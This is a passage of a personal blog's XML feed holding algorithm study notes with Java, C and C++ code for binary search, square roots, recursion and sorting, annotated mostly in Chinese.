class="keyword">else</span> {</span><br><span class="line">      low = mid + <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="find-the-last-element-which-less-or-equal-to-the-target-number"><a href="#find-the-last-element-which-less-or-equal-to-the-target-number" class="headerlink" title="find the last element which less or equal to the target number"></a>find the last element which less or equal to the target number</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">bsearch7</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n, <span class="keyword">int</span> value)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> high = n - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (low &lt;= high) {</span><br><span class="line">    <span class="keyword">int</span> mid =  low + ((high - low) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (a[mid] &gt; value) {</span><br><span class="line">      high = mid - <span class="number">1</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      <span class="keyword">if</span> ((mid == n - <span class="number">1</span>) || (a[mid + <span class="number">1</span>] &gt; value)) <span class="keyword">return</span> mid;</span><br><span class="line">      <span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="how-to-get-the-number&#x2019;s-square-root"><a href="#how-to-get-the-number&#x2019;s-square-root" class="headerlink" title="how to get the number&#x2019;s square root"></a>how to get the number&#x2019;s square root</h3><h4 id="newton&#x2019;s-method"><a href="#newton&#x2019;s-method" class="headerlink" title="newton&#x2019;s method"></a>newton&#x2019;s method</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">sqr</span><span class="params">(<span class="keyword">double</span> n)</span> </span>{ </span><br><span class="line">    <span class="keyword">double</span> k=<span class="number">1.0</span>; </span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">abs</span>(k*k-n)&gt;<span class="number">1e-9</span>) { </span><br><span class="line">        k=(k+n/k)/<span class="number">2</span>; </span><br><span class="line">    } </span><br><span class="line">    <span class="keyword">return</span> k; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="magic-number"><a href="#magic-number" class="headerlink" title="magic number"></a>magic number</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">Q_rsqrt</span><span class="params">( <span class="keyword">float</span> number )</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">long</span> i;</span><br><span class="line">    <span class="keyword">float</span> x2, y;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">float</span> threehalfs = <span class="number">1.5F</span>;</span><br><span class="line"></span><br><span class="line">    x2 = number * <span class="number">0.5F</span>;</span><br><span class="line">    y  = number;</span><br><span class="line">    i  = * ( <span class="keyword">long</span> * ) &amp;y; <span class="comment">// evil floating point bit level hacking</span></span><br><span class="line">    i  = <span class="number">0x5f3759df</span> - ( i &gt;&gt; <span class="number">1</span> );  <span class="comment">// what the fuck? </span></span><br><span class="line">    y  = * ( <span class="keyword">float</span> * ) &amp;i;</span><br><span class="line">    y  = y * ( threehalfs - ( x2 * y * y ) );  <span class="comment">// 1st iteration </span></span><br><span class="line">    <span class="comment">// 2nd iteration, this can be removed</span></span><br><span class="line">    <span class="comment">// y  = y * ( threehalfs - ( x2 * y * y ) ); </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Recursion</title>
      <link href="/2018/10/28/Recursion/"/>
      <url>/2018/10/28/Recursion/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_e7e778994e90265344f6ac9da39e01bf.jpg" alt=""></p><a id="more"></a><p><img src="http://p4wiqzx0i.bkt.clouddn.com/%E9%80%92%E5%BD%92.png" alt=""></p><h3 id="how-to-avoid-stack-overflow&#xFF1A;"><a href="#how-to-avoid-stack-overflow&#xFF1A;" class="headerlink" title="how to avoid stack overflow&#xFF1A;"></a>how to avoid stack overflow&#xFF1A;</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x8868;&#x793A;&#x9012;&#x5F52;&#x7684;&#x6DF1;&#x5EA6;&#x3002;</span></span><br><span class="line"><span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span> </span>{</span><br><span class="line">  ++depth&#xFF1B;</span><br><span class="line">  <span class="keyword">if</span> (depth &gt; <span class="number">1000</span>) <span class="keyword">throw</span> exception;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> f(n-<span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="how-to-avoid-repeated-calculation"><a href="#how-to-avoid-repeated-calculation" class="headerlink" title="how to avoid repeated calculation:"></a>how to avoid repeated calculation:</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span> </span>{</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// hasSolvedList &#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x6210;&#x4E00;&#x4E2A; Map&#xFF0C;key &#x662F; n&#xFF0C;value &#x662F; f(n)</span></span><br><span class="line">  <span class="keyword">if</span> (hasSolvedList.containsKey(n)) {</span><br><span class="line">    <span class="keyword">return</span> hasSovledList.get(n);</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> ret = f(n-<span class="number">1</span>) + f(n-<span class="number">2</span>);</span><br><span class="line">  hasSovledList.put(n, ret);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="recursion-convert-non-recursion"><a href="#recursion-convert-non-recursion" class="headerlink" title="recursion convert non-recursion:"></a>recursion convert non-recursion:</h3><p>recursion code&#xFF1A;<br></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span> </span>{</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> f(n-<span class="number">1</span>) + f(n-<span class="number">2</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>non-recursion code&#xFF1A;<br></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span> </span>{</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> pre = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">int</span> prepre = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; ++i) {</span><br><span class="line">    ret = pre + prepre;</span><br><span class="line">    prepre = pre;</span><br><span class="line">    pre = ret;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sort</title>
      <link href="/2018/10/28/Sort/"/>
      <url>/2018/10/28/Sort/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_fb8394a588b12ff6695cfd664afb17cd.jpg" alt=""></p><a id="more"></a><p><img src="http://p4wiqzx0i.bkt.clouddn.com/%E6%8E%92%E5%BA%8F.png" alt=""></p><p><a href="https://www.cnblogs.com/ruruozhenhao/category/1320597.html" target="_blank" rel="noopener">The questions about sort</a></p><h3 id="Bubble-Sort"><a href="#Bubble-Sort" class="headerlink" title="Bubble Sort:"></a>Bubble Sort:</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x5192;&#x6CE1;&#x6392;&#x5E8F;&#xFF0C;a &#x8868;&#x793A;&#x6570;&#x7EC4;&#xFF0C;n &#x8868;&#x793A;&#x6570;&#x7EC4;&#x5927;&#x5C0F;</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n)</span> </span>{</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) {</span><br><span class="line">    <span class="comment">// &#x63D0;&#x524D;&#x9000;&#x51FA;&#x5192;&#x6CE1;&#x5FAA;&#x73AF;&#x7684;&#x6807;&#x5FD7;&#x4F4D;</span></span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; ++j) {</span><br><span class="line">      <span class="keyword">if</span> (a[j] &gt; a[j+<span class="number">1</span>]) { <span class="comment">// &#x4EA4;&#x6362;</span></span><br><span class="line">        <span class="keyword">int</span> tmp = a[j];</span><br><span class="line">        a[j] = a[j+<span class="number">1</span>];</span><br><span class="line">        a[j+<span class="number">1</span>] = tmp;</span><br><span class="line">        flag = <span class="keyword">true</span>;  <span class="comment">// &#x8868;&#x793A;&#x6709;&#x6570;&#x636E;&#x4EA4;&#x6362;      </span></span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (!flag) <span class="keyword">break</span>;  <span class="comment">// &#x6CA1;&#x6709;&#x6570;&#x636E;&#x4EA4;&#x6362;&#xFF0C;&#x63D0;&#x524D;&#x9000;&#x51FA;</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Insert-Sort"><a href="#Insert-Sort" class="headerlink" title="Insert Sort:"></a>Insert Sort:</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x63D2;&#x5165;&#x6392;&#x5E8F;&#xFF0C;a &#x8868;&#x793A;&#x6570;&#x7EC4;&#xFF0C;n &#x8868;&#x793A;&#x6570;&#x7EC4;&#x5927;&#x5C0F;</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertionSort</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n)</span> </span>{</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) {</span><br><span class="line">    <span class="keyword">int</span> value = a[i];</span><br><span class="line">    <span class="keyword">int</span> j = i - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// &#x67E5;&#x627E;&#x63D2;&#x5165;&#x7684;&#x4F4D;&#x7F6E;</span></span><br><span class="line">    <span class="keyword">for</span> (; j &gt;= <span class="number">0</span>; --j) {</span><br><span class="line">      <span class="keyword">if</span> (a[j] &gt; value) {</span><br><span class="line">        a[j+<span class="number">1</span>] = a[j];  <span class="comment">// &#x6570;&#x636E;&#x79FB;&#x52A8;</span></span><br><span class="line">      } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    a[j+<span class="number">1</span>] = value; <span class="comment">// &#x63D2;&#x5165;&#x6570;&#x636E;</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>Insertion Sort List:</strong><br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> {</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">insertionSortList</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        ListNode* dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode* cur = head;</span><br><span class="line">        dummy-&gt;next = head;</span><br><span class="line">        ListNode* prev = <span class="literal">NULL</span>;</span><br><span class="line">        ListNode* temp = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">NULL</span> &amp;&amp; cur-&gt;next != <span class="literal">NULL</span>) {</span><br><span class="line">            <span class="keyword">if</span> (cur-&gt;val &lt;= cur-&gt;next-&gt;val) {</span><br><span class="line">                cur = cur-&gt;next;</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                temp = cur-&gt;next;</span><br><span class="line">                cur-&gt;next = temp-&gt;next;</span><br><span class="line">                prev = dummy;</span><br><span class="line">                <span class="keyword">while</span> (prev-&gt;next-&gt;val &lt;= temp-&gt;val) {</span><br><span class="line">                    prev = prev-&gt;next;</span><br><span class="line">                }</span><br><span class="line">                temp-&gt;next = prev-&gt;next;</span><br><span class="line">                prev-&gt;next = temp;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Sesection-Sort"><a href="#Sesection-Sort" class="headerlink" title="Sesection Sort:"></a>Sesection Sort:</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sectionSort</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n)</span> </span>{</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) {</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; n; ++j) {</span><br><span class="line">      <span class="keyword">if</span> (a[i] &gt; a[j]) {</span><br><span class="line">      <span class="keyword">int</span> temp = a[i];</span><br><span class="line">        a[i] = a[j];</span><br><span class="line">        a[j] = temp;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Why-Insert-sort-more-effictive-than-Bubble-sort"><a href="#Why-Insert-sort-more-effictive-than-Bubble-sort" class="headerlink" title="Why Insert sort more effictive than Bubble sort:"></a>Why Insert sort more effictive than Bubble sort:</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x5192;&#x6CE1;&#x6392;&#x5E8F;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x4EA4;&#x6362;&#x64CD;&#x4F5C;&#xFF1A;</span><br><span class="line"><span class="keyword">if</span> (a[j] &gt; a[j+<span class="number">1</span>]) { <span class="comment">// &#x4EA4;&#x6362;</span></span><br><span class="line">   <span class="keyword">int</span> tmp = a[j];</span><br><span class="line">   a[j] = a[j+<span class="number">1</span>];</span><br><span class="line">   a[j+<span class="number">1</span>] = tmp;</span><br><span class="line">   flag = <span class="keyword">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">&#x63D2;&#x5165;&#x6392;&#x5E8F;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x79FB;&#x52A8;&#x64CD;&#x4F5C;&#xFF1A;</span><br><span class="line"><span class="keyword">if</span> (a[j] &gt; value) {</span><br><span class="line">  a[j+<span class="number">1</span>] = a[j];  <span class="comment">// &#x6570;&#x636E;&#x79FB;&#x52A8;</span></span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Merge-Sort"><a href="#Merge-Sort" class="headerlink" title="Merge Sort:"></a>Merge Sort:</h3><p><strong>Recursive formula</strong><br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x9012;&#x63A8;&#x516C;&#x5F0F;&#xFF1A;</span><br><span class="line">merge_sort(p&#x2026;r) = merge(merge_sort(p&#x2026;q), merge_sort(q+<span class="number">1</span>&#x2026;r))</span><br><span class="line"></span><br><span class="line">&#x7EC8;&#x6B62;&#x6761;&#x4EF6;&#xFF1A;</span><br><span class="line">p &gt;= r &#x4E0D;&#x7528;&#x518D;&#x7EE7;&#x7EED;&#x5206;&#x89E3;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>Fake Code:</strong><br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;, A &#x662F;&#x6570;&#x7EC4;&#xFF0C;n &#x8868;&#x793A;&#x6570;&#x7EC4;&#x5927;&#x5C0F;</span></span><br><span class="line">merge_sort(A, n) {</span><br><span class="line">  merge_sort_c(A, <span class="number">0</span>, n<span class="number">-1</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x9012;&#x5F52;&#x8C03;&#x7528;&#x51FD;&#x6570;</span></span><br><span class="line">merge_sort_c(A, p, r) {</span><br><span class="line">  <span class="comment">// &#x9012;&#x5F52;&#x7EC8;&#x6B62;&#x6761;&#x4EF6;</span></span><br><span class="line">  <span class="keyword">if</span> p &gt;= r  then <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// &#x53D6; p &#x5230; r &#x4E4B;&#x95F4;&#x7684;&#x4E2D;&#x95F4;&#x4F4D;&#x7F6E; q</span></span><br><span class="line">  q = (p+r) / <span class="number">2</span></span><br><span class="line">  <span class="comment">// &#x5206;&#x6CBB;&#x9012;&#x5F52;</span></span><br><span class="line">  merge_sort_c(A, p, q)</span><br><span class="line">  merge_sort_c(A, q+<span class="number">1</span>, r)</span><br><span class="line">  <span class="comment">// &#x5C06; A[p...q] &#x548C; A[q+1...r] &#x5408;&#x5E76;&#x4E3A; A[p...r]</span></span><br><span class="line">  merge(A[p...r], A[p...q], A[q+<span class="number">1.</span>..r])</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>Merge function:</strong><br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">merge(A[p...r], A[p...q], A[q+<span class="number">1.</span>..r]) {</span><br><span class="line">  var i := p&#xFF0C;j := q+<span class="number">1</span>&#xFF0C;k := <span class="number">0</span> <span class="comment">// &#x521D;&#x59CB;&#x5316;&#x53D8;&#x91CF; i, j, k</span></span><br><span class="line">  var tmp := <span class="keyword">new</span> <span class="built_in">array</span>[<span class="number">0.</span>..r-p] <span class="comment">// &#x7533;&#x8BF7;&#x4E00;&#x4E2A;&#x5927;&#x5C0F;&#x8DDF; A[p...r] &#x4E00;&#x6837;&#x7684;&#x4E34;&#x65F6;&#x6570;&#x7EC4;</span></span><br><span class="line">  <span class="keyword">while</span> i&lt;=q AND j&lt;=r <span class="keyword">do</span> {</span><br><span class="line">    <span class="keyword">if</span> A[i] &lt;= A[j] {</span><br><span class="line">      tmp[k++] = A[i++] <span class="comment">// i++ &#x7B49;&#x4E8E; i:=i+1</span></span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      tmp[k++] = A[j++]</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &#x5224;&#x65AD;&#x54EA;&#x4E2A;&#x5B50;&#x6570;&#x7EC4;&#x4E2D;&#x6709;&#x5269;&#x4F59;&#x7684;&#x6570;&#x636E;</span></span><br><span class="line">  var start := i&#xFF0C;end := q</span><br><span class="line">  <span class="keyword">if</span> j&lt;=r then start := j, end:=r</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &#x5C06;&#x5269;&#x4F59;&#x7684;&#x6570;&#x636E;&#x62F7;&#x8D1D;&#x5230;&#x4E34;&#x65F6;&#x6570;&#x7EC4; tmp</span></span><br><span class="line">  <span class="keyword">while</span> start &lt;= end <span class="keyword">do</span> {</span><br><span class="line">    tmp[k++] = A[start++]</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &#x5C06; tmp &#x4E2D;&#x7684;&#x6570;&#x7EC4;&#x62F7;&#x8D1D;&#x56DE; A[p...r]</span></span><br><span class="line">  <span class="keyword">for</span> i:=<span class="number">0</span> to r-p <span class="keyword">do</span> {</span><br><span class="line">    A[p+i] = tmp[i]</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>merge sort list</strong><br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span 